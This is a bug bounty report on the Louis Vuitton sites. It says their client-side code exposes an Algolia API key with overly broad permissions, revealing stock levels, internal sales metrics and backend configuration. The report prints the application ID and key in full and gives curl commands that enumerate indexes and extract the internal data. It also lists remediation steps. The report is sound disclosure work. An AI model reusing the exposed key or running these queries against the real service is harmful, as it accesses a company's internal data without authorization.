# Bug Bounty Report: Exposed Algolia API Key Leaking Sensitive Business Data

## Summary

An Algolia API key with `search`, `listIndexes`, and `settings` permissions is exposed in the client-side JavaScript of `us.louisvuitton.com` (and all country locales). This key provides **unauthenticated access** to the entire product catalog across all regions, including sensitive internal business data such as real-time inventory stock levels, internal conversion metrics, pricing strategy data, and backend service configuration.

---

## Severity: **High**

---

## Affected Asset

- **URL:** `https://us.louisvuitton.com/eng-us/gifts/father-s-day-gifts/_/N-tffxake` (and all `[country].louisvuitton.com` locales)
- **Exposed in:** Client-side JavaScript — observable in browser Network tab as requests to Algolia API
- **Algolia Application ID:** `9B5OL3HHSM`
- **Algolia API Key:** `a2263f2e7f09a315abd6d9855972d585`

---

## Vulnerability Details

The Algolia search API key is used by the frontend JavaScript on all `*.louisvuitton.com` country locale sites. While search-only keys are commonly exposed for client-side search functionality, this particular key has **overly permissive access** that exposes sensitive internal business intelligence data that should never be accessible to end users.

### What makes this different from a normal search key:
- `listIndexes` — allows enumerating ALL 200+ internal indexes (all locales, test indexes, BFF config, content management rules)
- `settings` — allows reading full index configuration and schema
- No `unretrievableAttributes` configured — ALL internal fields are returned including stock levels, business metrics, and OMS data

---

## Impact — "What Can an Attacker Gain?"

### 1. Real-Time Inventory Intelligence
An attacker can query exact stock levels for all 163,728+ products across every locale. This enables:
- **Targeted scalping/botting** of limited-edition luxury items by monitoring stock counts in real-time
- **Competitor intelligence** — a rival brand can track LV's inventory position globally

### 2. Internal Business Metrics Exposure
Each product record exposes fields intended only for internal use:

| Field | What It Reveals |
|-------|-----------------|
| `stockLevel` | Exact inventory count per SKU |
| `cfaRate` | Internal conversion-from-add-to-cart rate |
| `digitalConversion` | Digital sales performance metric |
| `turnoverClassification` | Product revenue priority ranking (1-5) |
| `omsAvailability.status` | Real-time Order Management System status |
| `omsAvailability.receivedTime` | OMS data freshness timestamp |
| `priceDetail.currentBeginDate` | Exact date current price took effect |
| `sellableChannels` | Which channels (APP, CSC, RETAIL, WEB) a product sells on |
| `cscSellable` / `cscOrderable` | Client Service Center internal flags |

### 3. Full Infrastructure Enumeration
The `listIndexes` permission reveals:
- All country locale indexes and their sizes (200+ indexes)
- `BFF_CONFIG` — Backend-for-Frontend service configuration (CoreMedia health flags, store config schema)
- `cm-rule` — Content Management merchandising rules for Product Listing Pages
- `neural-sku-*` — AI/ML powered search model indexes
- Internal test indexes (e.g., `sku-en-us-MSR-TEST`)

### 4. Index Settings & Schema Disclosure
Full index configuration is readable including:
- 149 facetable attributes (full internal data model)
- Complete searchable attributes list
- `unretrievableAttributes: None` — confirming nothing is protected
- Replica configuration and neural search setup

---

## Steps to Reproduce

### Step 1: Observe the API key in browser traffic

1. Open `https://us.louisvuitton.com/eng-us/homepage` in Chrome
2. Open DevTools (F12) → Network tab
3. Use the search bar on the website or browse products
4. Filter Network requests by `algolia`
5. Observe requests to `https://insights.algolia.io/1/events?X-Algolia-Application-Id=9B5OL3HHSM&X-Algolia-API-Key=a2263f2e7f09a315abd6d9855972d585`

> **[Screenshot 1: Network tab showing Algolia request with API key in URL parameters]**

### Step 2: List all indexes (200+)
```bash
curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" "https://9B5OL3HHSM-dsn.algolia.net/1/indexes" | python3 -m json.tool | head -50
```

> **[Screenshot 2: Terminal showing list of internal indexes including cm-rule, sku-th-th, etc.]**

### Step 3: Extract sensitive inventory and business data
```bash
curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" -H "Content-Type: application/json" -X POST -d '{"query":"","hitsPerPage":1,"filters":"stockLevel > 0 AND price > 10000","attributesToRetrieve":["skuId","displayName","price","stockLevel","cfaRate","digitalConversion","turnoverClassification"]}' "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/query" | python3 -m json.tool
```

> **[Screenshot 3: Terminal showing product with stockLevel, price, cfaRate, turnoverClassification exposed]**

### Step 4: Access internal BFF service configuration
```bash
curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" -H "Content-Type: application/json" -X POST -d '{"query":"","hitsPerPage":5}' "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/BFF_CONFIG/query" | python3 -m json.tool | head -40
```

> **[Screenshot 4: Terminal showing BFF_CONFIG with CoreMedia health status and internal config]**

### Step 5: Read full index settings/schema
```bash
curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/settings" | python3 -m json.tool | head -40
```

> **[Screenshot 5: Terminal showing index settings with unretrievableAttributes empty and full schema]**

---

## Proof of Exploitation

### API Key found in browser traffic:
```
https://insights.algolia.io/1/events?X-Algolia-Application-Id=9B5OL3HHSM&X-Algolia-API-Key=a2263f2e7f09a315abd6d9855972d585
```

### High-Value Items with Stock Levels Exposed:
```
SKU: N40853 | LV x Darjeeling Limited Coffret Accessoires
  omsAvailability: {"status": true, "receivedTime": 1778974489738}
  Categories include: "Spring-Summer 2026 Show", "Valentine's Day Gifts for Him"
```

### Data Scale:
- **163,728 SKUs** accessible per locale index
- **200+ indexes** enumerable (all locales, all replicas, internal configs)
- **BFF_CONFIG** — 6 entries exposing backend service configuration
- Internal test indexes visible (e.g., `sku-en-us-MSR-TEST`)

---

## Recommended Remediation

1. **Restrict the Algolia API key's permissions** — remove `listIndexes` and `settings` ACLs from the public-facing search key
2. **Configure `unretrievableAttributes`** in index settings to hide:
   - `stockLevel`
   - `cfaRate`
   - `digitalConversion`
   - `turnoverClassification`
   - `omsAvailability`
   - `priceDetail`
   - `sellableChannels`
   - `cscSellable` / `cscOrderable`
3. **Move `BFF_CONFIG` to a restricted key** — this index should not be queryable by the public search key
4. **Restrict index access** — the public key should only access the user's current locale index, not all 200+
5. **Rotate the API key** after applying restrictions

---

## Classification

- **Vulnerability Type:** Exposed secrets, credentials or sensitive information on an asset under our control and affecting at least one of our scopes
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-312:** Cleartext Storage of Sensitive Information

---

**Tested with User-Agent suffix:** `lvm-ywh-pbb`
